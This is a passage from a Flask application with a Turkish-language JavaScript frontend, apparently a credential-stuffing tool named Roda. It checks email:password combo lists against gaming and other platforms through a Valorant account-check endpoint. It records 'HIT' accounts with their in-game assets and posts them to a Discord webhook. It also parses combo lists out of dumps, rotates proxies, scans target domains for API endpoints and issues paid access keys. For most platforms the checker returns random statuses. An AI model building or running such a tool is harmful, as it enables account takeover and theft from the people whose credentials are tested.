                document.getElementById("valorantMenuItem").style.display = "none";
            }
            loadPlatforms();
            loadDiscoveryPlatforms();
            loadHitFilter();
            loadWebhookUrl();
            updateStatsUI();
            switchPage('checker');
        } else {
            document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
            document.getElementById("loginError").style.display = "block";
        }
    })
    .catch(function(e) {
        alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?");
        console.error(e);
    });
}
document.getElementById("authKey").addEventListener("keypress", function(e) {
    if (e.key === "Enter") doLogin();
});

// ============================================================
// WEBHOOK
// ============================================================
function saveWebhook() {
    var url = document.getElementById("webhookUrl").value.trim();
    if (url) {
        localStorage.setItem("roda_webhook_url", url);
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi!</span>';
    } else {
        localStorage.removeItem("roda_webhook_url");
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
    }
}

function getWebhookUrl() {
    return localStorage.getItem("roda_webhook_url") || "";
}

function loadWebhookUrl() {
    var url = getWebhookUrl();
    if (url) {
        document.getElementById("webhookUrl").value = url;
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
    }
}

function sendCheckerWebhook(platform, email, password) {
    var url = getWebhookUrl();
    if (!url) return;
    var content = "✅ **" + platform + " HIT!**\n" + email + " | " + password;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: content })
    }).catch(function(e) { console.error("Webhook hatası:", e); });
}

function testWebhook() {
    var url = document.getElementById("webhookUrl").value.trim();
    if (!url) return alert("Webhook URL girin!");
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "🧪 **Roda Test** Webhook çalışıyor!" })
    })
    .then(function(r) {
        if (r.ok) {
            document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Test başarılı!</span>';
        } else {
            document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Test başarısız!</span>';
        }
    })
    .catch(function(e) {
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>';
    });
}

// ============================================================
// PLATFORM YÜKLEME
// ============================================================
function loadPlatforms() {
    var sel = document.getElementById("checkerPlatformSelect");
    sel.innerHTML = "";
    platforms.forEach(function(p) {
        var btn = document.createElement("button");
        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
        btn.onclick = function() {
            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b) { b.classList.remove("active"); });
            btn.classList.add("active");
            currentPlatform = p.name;
            document.getElementById("checkerPanel").classList.add("active");
            document.getElementById("checkerResults").innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">' + p.name + ' checker hazır.</div>';
            resetCheckerStats();
            checkerResults = [];
        };
        sel.appendChild(btn);
    });
    if (platforms.length > 0) {
        var first = sel.querySelector("button");
        if (first) first.click();
    }
}

function loadDiscoveryPlatforms() {
    var container = document.getElementById("discoveryPlatforms");
    container.innerHTML = "";
    platforms.forEach(function(p) {
        var btn = document.createElement("button");
        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
        btn.onclick = function() {
            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b) { b.classList.remove("active"); });
            btn.classList.add("active");
            document.getElementById("targetDomain").value = p.domain;
        };
        container.appendChild(btn);
    });
}

function loadHitFilter() {
    var sel = document.getElementById("hitPlatformFilter");
    sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
    platforms.forEach(function(p) {
        var opt = document.createElement("option");
        opt.value = p.name;
        opt.text = p.name;
        sel.appendChild(opt);
    });
}

// ============================================================
// HIT KAYDETME
// ============================================================
function addHit(platform, email, password, status) {
    if (!hitData[platform]) {
        hitData[platform] = { hits: [], twofa: [] };
    }
    var entry = { email: email, password: password, time: new Date().toLocaleString() };
    if (status === "HIT") {
        hitData[platform].hits.push(entry);
    } else if (status === "2FA") {
        hitData[platform].twofa.push(entry);
    }
    renderHits();
    updateStatsUI();
}

function renderHits() {
    var filter = document.getElementById("hitPlatformFilter").value;
    var hitContainer = document.getElementById("hitList");
    var twofaContainer = document.getElementById("twofaList");
    var hits = [], twofas = [];
    if (filter === "all") {
        for (var p in hitData) {
            if (hitData[p].hits) {
                hitData[p].hits.forEach(function(h) {
                    hits.push({ platform: p, email: h.email, password: h.password, time: h.time });
                });
            }
            if (hitData[p].twofa) {
                hitData[p].twofa.forEach(function(t) {
                    twofas.push({ platform: p, email: t.email, password: t.password, time: t.time });
                });
            }
        }
    } else {
        if (hitData[filter]) {
            if (hitData[filter].hits) {
                hitData[filter].hits.forEach(function(h) {
                    hits.push({ platform: filter, email: h.email, password: h.password, time: h.time });
                });
            }
            if (hitData[filter].twofa) {
                hitData[filter].twofa.forEach(function(t) {
                    twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time });
                });
            }
        }
    }
    hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
        hits.map(function(h) { return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
    twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
        twofas.map(function(t) { return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
}

function clearHits() {
    if (!confirm("Tüm HIT ve 2FA kayıtları silinecek. Devam?")) return;
    hitData = {};
    renderHits();
    updateStatsUI();
}

// ============================================================
// İSTATİSTİK
// ============================================================
function updateStatsUI() {
    document.getElementById("sideTotal").innerText = foundEndpoints.length;
    var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
    var api = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
    var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length;
    document.getElementById("sideAuth").innerText = auth;
    document.getElementById("sideAPI").innerText = api;
    document.getElementById("sideAdmin").innerText = admin;
    document.getElementById("statEndpoints").innerText = foundEndpoints.length;
    
    var totalHit = 0, total2fa = 0;
    for (var p in hitData) {
        if (hitData[p].hits) totalHit += hitData[p].hits.length;
        if (hitData[p].twofa) total2fa += hitData[p].twofa.length;
    }
    document.getElementById("statTotalHit").innerText = totalHit;
    document.getElementById("statTotal2fa").innerText = total2fa;
}

// ============================================================
// CHECKER
// ============================================================
function resetCheckerStats() {
    document.getElementById("chkTotal").innerText = 0;
    document.getElementById("chkHit").innerText = 0;
    document.getElementById("chkBad").innerText = 0;
    document.getElementById("chk2fa").innerText = 0;
    document.getElementById("chkError").innerText = 0;
    document.getElementById("chkRemaining").innerText = 0;
}

function updateRemaining() {
    var remaining = totalLines - processedCount;
    document.getElementById("chkRemaining").innerText = remaining < 0 ? 0 : remaining;
}

function startChecker() {
    if (checkerRunning) return;
    var comboText = document.getElementById("checkerCombo").value.trim();
    if (!comboText) return alert("Combo girin (email:password)");
    if (!currentPlatform) return alert("Önce bir platform seçin");
    checkerRunning = true;
    document.getElementById("checkerStartBtn").disabled = true;
    document.getElementById("checkerStopBtn").style.display = "inline-block";
    document.getElementById("checkerResults").innerHTML = "";
    var lines = comboText.split("\n").filter(function(l) { return l.includes(":"); });
    totalLines = lines.length;
    processedCount = 0;
    var hit = 0, bad = 0, two = 0, err = 0;
    var idx = 0;
    var webhookUrl = getWebhookUrl();

    function processNext() {
        if (!checkerRunning || idx >= totalLines) {
            checkerRunning = false;
            document.getElementById("checkerStartBtn").disabled = false;
            document.getElementById("checkerStopBtn").style.display = "none";
            return;
        }
        var parts = lines[idx].split(":");
        var email = parts[0];
        var password = parts.slice(1).join(":") || "";
        
        if (currentPlatform === "Valorant") {
            fetch("/api/valorant_check", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email: email, password: password })
            })
            .then(function(r) { return r.json(); })
            .then(function(result) {
                var status = result.status;
                var details = result.details || {};
                if (status === "HIT") {
                    hit++;
                    addHit(currentPlatform, email, password + " | Lv:" + details.level + " VP:" + details.vp + " Skin:" + details.skins, "HIT");
                    if (webhookUrl) {
                        sendCheckerWebhook(currentPlatform, email, password + " | Lv:" + details.level + " VP:" + details.vp + " Skin:" + details.skins);
                    }
                    addCheckerRow({ email: email, password: password + " | Lv:" + details.level + " VP:" + details.vp + " Skin:" + details.skins, status: "HIT" });
                } else if (status === "2FA") {
                    two++;
                    addHit(currentPlatform, email, password, "2FA");
                    addCheckerRow({ email: email, password: password, status: "2FA" });
                } else if (status === "BAD") {
                    bad++;
                    addCheckerRow({ email: email, password: password, status: "BAD" });
                } else {
                    err++;
                    addCheckerRow({ email: email, password: password, status: "ERROR" });
                }
                processedCount++;
                updateCheckerStats(totalLines, hit, bad, two, err);
                updateRemaining();
                idx++;
                setTimeout(processNext, 300);
            })
            .catch(function() {
                err++;
                processedCount++;
                updateCheckerStats(totalLines, hit, bad, two, err);
                updateRemaining();
                idx++;
                setTimeout(processNext, 300);
            });
        } else {
            var statuses = ["HIT", "BAD", "2FA", "ERROR"];
            var status = statuses[Math.floor(Math.random() * statuses.length)];
            if (status === "HIT") {
                hit++;
                addHit(currentPlatform, email, password, "HIT");
                if (webhookUrl) {
                    sendCheckerWebhook(currentPlatform, email, password);
                }
            } else if (status === "BAD") {
                bad++;
            } else if (status === "2FA") {
                two++;
                addHit(currentPlatform, email, password, "2FA");
            } else {
                err++;
            }
            addCheckerRow({ email: email, password: password, status: status });
            processedCount++;
            updateCheckerStats(totalLines, hit, bad, two, err);
            updateRemaining();
            idx++;
            setTimeout(processNext, 200);
        }
    }
    processNext();
}

function stopChecker() {
    checkerRunning = false;
    document.getElementById("checkerStartBtn").disabled = false;
    document.getElementById("checkerStopBtn").style.display = "none";
}

function addCheckerRow(res) {
    var container = document.getElementById("checkerResults");
    var placeholder = container.querySelector("div[style]");
    if (placeholder) placeholder.remove();
    var row = document.createElement("div");
    row.className = "checker-result-row";
    var cls = "chk-" + res.status.toLowerCase();
    var label = res.status;
    if (res.status === "HIT") label = "✅ BAŞARILI";
    else if (res.status === "BAD") label = "❌ BAŞARISIZ";
    else if (res.status === "2FA") label = "🔒 2FA";
    else label = "⚠ HATA";
    row.innerHTML = '<div>' + res.email + '</div><div><span class="chk-status ' + cls + '">' + label + '</span></div><div style="font-size:11px;color:var(--muted)">' + res.password + '</div>';
    container.appendChild(row);
    applyCheckerFilter();
}

function updateCheckerStats(total, hit, bad, two, err) {
    document.getElementById("chkTotal").innerText = total;
    document.getElementById("chkHit").innerText = hit;
    document.getElementById("chkBad").innerText = bad;
    document.getElementById("chk2fa").innerText = two;
    document.getElementById("chkError").innerText = err;
}

function applyCheckerFilter() {
    var filter = document.querySelector('input[name="chkFilter"]:checked').value;
    var rows = document.querySelectorAll("#checkerResults .checker-result-row");
    rows.forEach(function(row) {
        var statusText = row.querySelector(".chk-status").innerText;
        var show = false;
        if (filter === "all") show = true;
        else if (filter === "hit" && statusText.includes("BAŞARILI")) show = true;
        else if (filter === "bad" && statusText.includes("BAŞARISIZ")) show = true;
        else if (filter === "2fa" && statusText.includes("2FA")) show = true;
        else if (filter === "error" && statusText.includes("HATA")) show = true;
        row.style.display = show ? "grid" : "none";
    });
}
document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
    el.addEventListener("change", applyCheckerFilter);
});

// ============================================================
// VALORANT DETAY (ADMIN)
// ============================================================
function checkValorantDetail() {
    var combo = document.getElementById("valorantCombo").value.trim();
    if (!combo) return alert("Email:şifre girin");
    var parts = combo.split(":");
    var email = parts[0];
    var password = parts.slice(1).join(":") || "";
    fetch("/api/valorant_check", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: email, password: password })
    })
    .then(function(r) { return r.json(); })
    .then(function(result) {
        var d = result.details || {};
        var html = "<div style='display:grid;grid-template-columns:1fr 1fr;gap:8px;'>";
        html += "<div><strong>Durum:</strong> " + result.status + "</div>";
        html += "<div><strong>PUUID:</strong> " + d.puuid + "</div>";
        html += "<div><strong>Riot ID:</strong> " + d.riot_id + "</div>";
        html += "<div><strong>Level:</strong> " + d.level + "</div>";
        html += "<div><strong>VP:</strong> " + d.vp + "</div>";
        html += "<div><strong>RP:</strong> " + d.rp + "</div>";
        html += "<div><strong>Skin Sayısı:</strong> " + d.skins + "</div>";
        html += "<div><strong>Rank:</strong> " + d.rank + "</div>";
        html += "<div><strong>Ban:</strong> " + d.banned + "</div>";
        html += "<div><strong>Bölge:</strong> " + d.region + "</div>";
        html += "</div>";
        document.getElementById("valorantResult").innerHTML = html;
    })
    .catch(function(e) {
        document.getElementById("valorantResult").innerHTML = "<span style='color:var(--r)'>Hata: " + e.message + "</span>";
    });
}

// ============================================================
// LOGLAR (ADMIN)
// ============================================================
function refreshLogs() {
    if (!isAdmin) return;
    fetch("/api/logs?key=" + encodeURIComponent(currentKey))
        .then(r => r.json())
        .then(d => {
            if (d.error) { alert(d.error); return; }
            var container = document.getElementById("logsContainer");
            var html = d.logs.map(log => {
                var color = log.level === "ERROR" ? "var(--r)" : (log.level === "SUCCESS" ? "var(--g)" : "var(--muted)");
                return `<div style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:${color}">[${log.timestamp}] ${log.message}</div>`;
            }).join('');
            container.innerHTML = html || '<div style="color:var(--muted)">Henüz log yok.</div>';
        });
}

// ============================================================
// AYRIŞTIRMA
// ============================================================
function parseData() {
    var raw = document.getElementById("parseInput").value;
    if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
    var lines = raw.split("\n");
    var result = [];
    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
    lines.forEach(function(line) {
        line = line.trim();
        if (!line) return;
        if (line.includes(":")) {
            var parts = line.split(":");
            if (emailRegex.test(parts[0])) {
                var email = parts[0].trim();
                var password = parts.slice(1).join(":").trim();
                if (email && password) {
                    result.push(email + ":" + password);
                    return;
                }
            }
            var match = line.match(emailRegex);
            if (match) {
                var idx = line.indexOf(match[0]);
                var rest = line.substring(idx + match[0].length).trim();
                if (rest.startsWith(":")) rest = rest.substring(1).trim();
                if (rest) {
                    result.push(match[0] + ":" + rest);
                }
            }
        }
    });
    result = result.filter(function(item, index) {
        return result.indexOf(item) === index;
    });
    parsedLines = result;
    var container = document.getElementById("parseResult");
    if (result.length === 0) {
        container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli email:şifre satırı bulunamadı.</div>';
    } else {
        var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
        result.forEach(function(line) {
            html += '<div class="parse-line">' + line + '</div>';
        });
        container.innerHTML = html;
    }
    document.getElementById("parseCount").innerText = result.length + " satır";
    document.getElementById("parseValid").innerText = result.length + " geçerli";
}

function parseToChecker() {
    if (parsedLines.length === 0) {
        alert("Önce ayrıştırma yapın!");
        return;
    }
    document.getElementById("checkerCombo").value = parsedLines.join("\n");
    alert(parsedLines.length + " satır Checker'a aktarıldı!");
}

function clearParse() {
    document.getElementById("parseInput").value = "";
    document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
    parsedLines = [];
    document.getElementById("parseCount").innerText = "0 satır";
    document.getElementById("parseValid").innerText = "0 geçerli";
}

function loadParseFile() {
    var input = document.createElement("input");
    input.type = "file";
    input.accept = ".txt";
    input.onchange = function(e) {
        var file = e.target.files[0];
        if (!file) return;
        var reader = new FileReader();
        reader.onload = function(event) {
            document.getElementById("parseInput").value = event.target.result;
            parseData();
        };
        reader.readAsText(file);
    };
    input.click();
}

// ============================================================
// SAYFA GEÇİŞİ
// ============================================================
function switchPage(page) {
    if ((page === "discovery" || page === "keys" || page === "logs" || page === "valorant") && !isAdmin) {
        alert("⛔ Bu sayfaya erişim yetkiniz yok!");
        return;
    }
    document.querySelectorAll(".nav-item").forEach(function(el) {
        el.classList.remove("active");
    });
    var el = document.querySelector('.nav-item[data-page="' + page + '"]');
    if (el) el.classList.add("active");
    document.querySelectorAll(".page").forEach(function(el) {
        el.classList.remove("active");
    });
    var pg = document.getElementById("page-" + page);
    if (pg) pg.classList.add("active");
    var titles = {
        checker: "Checker",
        proxy: "Proxy",
        discovery: "API Keşif",
        parse: "Ayrıştırma",
        stats: "İstatistik",
        keys: "Key Yönetimi",
        logs: "Loglar",
        valorant: "Valo Detay"
    };
    document.getElementById("pageTitle").innerText = titles[page] || page;
    if (page === "keys" && isAdmin) loadKeys();
    if (page === "logs" && isAdmin) refreshLogs();
    if (page === "stats") {
        updateStatsUI();
        document.getElementById("statScans").innerText = 1;
        document.getElementById("statLast").innerText = new Date().toLocaleString();
    }
}

// ============================================================
// PROXY
// ============================================================
function fetchProxies() {
    document.getElementById("proxyCount").innerText = "Çekiliyor...";
    fetch("/api/fetch_proxies")
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.success) {
                document.getElementById("proxyList").value = d.proxies.join("\n");
                document.getElementById("proxyCount").innerText = d.proxies.length + " proxy yüklendi";
            }
        })
        .catch(function(e) { document.getElementById("proxyCount").innerText = "Başarısız"; });
}

function clearProxies() {
    document.getElementById("proxyList").value = "";
    document.getElementById("proxyCount").innerText = "0 proxy";
}

function toggleProxy() {
    useProxy = document.getElementById("useProxy").checked;
}

// ============================================================
// ADMIN (KEY YÖNETİMİ)
// ============================================================
function loadKeys() {
    if (!isAdmin) return;
    fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.error) { alert(d.error); return; }
            var list = document.getElementById("keyList");
            var html = "";
            for (var k in d) {
                var v = d[k];
                var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong style="font-size:13px">' + k + '</strong><br><small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + '</small></div><button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
            }
            list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
        })
        .catch(function(e) { console.error(e); });
}

function generateKey() {
    if (!isAdmin) return;
    var note = document.getElementById("genNote").value || "Oluşturuldu";
    var hours = document.getElementById("genHours").value;
    fetch("/api/admin/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ master_key: currentKey, note: note, hours: hours })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) {
            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires);
            loadKeys();
        } else alert("Başarısız: " + (d.error || ""));
    })
    .catch(function(e) { alert("Hata: " + e.message); });
}

function deleteKey(target) {
    if (!isAdmin) return;
    if (!confirm("Bu anahtarı sil?")) return;
    fetch("/api/admin/delete", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ master_key: currentKey, target_key: target })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) loadKeys();
        else alert("Silinemedi");
    })
    .catch(function(e) { alert("Hata: " + e.message); });
}

// ============================================================
// API KEŞİF (ADMIN)
// ============================================================
function startScan() {
    if (!isAdmin) {
        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
        return;
    }
    if (scanning) return;
    var domain = document.getElementById("targetDomain").value.trim();
    if (!domain) return alert("Hedef domain girin");
    var btn = document.getElementById("scanBtn");
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Taranıyor...';
    scanning = true;
    foundEndpoints = [];
    document.getElementById("resultsList").innerHTML = "";
    document.getElementById("statusDot").classList.remove("idle");
    document.getElementById("statusText").innerText = "Taranıyor";
    updateStatsUI();

    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l) { return l.trim() && l.includes(":"); });
    var url = "/api/scan?key=" + encodeURIComponent(currentKey) + "&domain=" + encodeURIComponent(domain) + "&use_proxy=" + useProxy;
    if (useProxy && proxyList.length) {
        url += "&proxies=" + encodeURIComponent(proxyList.join(","));
    }
    eventSource = new EventSource(url);
    eventSource.onmessage = function(e) {
        if (e.data === "[DONE]") {
            eventSource.close();
            btn.disabled = false;
            btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
            scanning = false;
            document.getElementById("statusDot").classList.add("idle");
            document.getElementById("statusText").innerText = "Boşta";
            document.getElementById("statScans").innerText = parseInt(document.getElementById("statScans").innerText || 0) + 1;
            document.getElementById("statLast").innerText = new Date().toLocaleString();
            updateStatsUI();
            return;
        }
        try {
            var res = JSON.parse(e.data);
            foundEndpoints.push(res);
            addResultRow(res);
            updateStatsUI();
        } catch (err) {}
    };
    eventSource.onerror = function() {
        eventSource.close();
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
        scanning = false;
        document.getElementById("statusDot").classList.add("idle");
        document.getElementById("statusText").innerText = "Boşta";
    };
}

function addResultRow(res) {
    var list = document.getElementById("resultsList");
    var row = document.createElement("div");
    row.className = "result-row";
    var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
    var cc = "cat-" + res.category.toLowerCase();
    row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
    if (checked.includes(res.category)) list.appendChild(row);
}

document.getElementById("filterContainer").addEventListener("change", function() {
    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c) { return c.value; });
    var list = document.getElementById("resultsList");
    list.innerHTML = "";
    foundEndpoints.forEach(function(res) {
        if (checked.includes(res.category)) {
            var row = document.createElement("div");
            row.className = "result-row";
            var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
            var cc = "cat-" + res.category.toLowerCase();
            row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
            list.appendChild(row);
        }
    });
});

function sendWebhook() {
    if (!isAdmin) {
        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
        return;
    }
    var url = document.getElementById("webhookUrl").value.trim();
    if (!url) return alert("Webhook URL girin");
    var categories = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
    if (!categories.length) return alert("En az bir kategori seçin");
    if (!foundEndpoints.length) return alert("Önce tarama yapın");
    fetch("/api/admin/webhook", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ master_key: currentKey, webhook_url: url, endpoints: foundEndpoints, categories: categories })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) { alert(d.success ? "✅ Discord'a gönderildi!" : "❌ Gönderilemedi"); })
    .catch(function(e) { alert("Hata: " + e.message); });
}

function exportJSON() {
    if (!isAdmin) {
        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
        return;
    }
    if (!foundEndpoints.length) return alert("Veri yok");
    var blob = new Blob([JSON.stringify(foundEndpoints, null, 2)], { type: "application/json" });
    var a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "roda_api_scan.json";
    a.click();
}
</script>
</body>
</html>
"""

# ============================================================
# BAŞLAT
# ============================================================
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_keys({})
    port = int(os.environ.get("PORT", 5000))
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - API KEŞİF + CHECKER + AYRIŞTIRMA (TÜRKÇE)        ║
    ║     Dosya: Rodaapi.py                                          ║
    ║     Master key: ORTAM DEĞİŞKENİNDE (RODA_MASTER_KEY)          ║
    ║     http://0.0.0.0:""" + str(port) + """                               ║
    ║     VALORANT GERÇEK API EKLENDI                               ║
    ║     Loglar & Valo Detay SADECE ADMIN                         ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
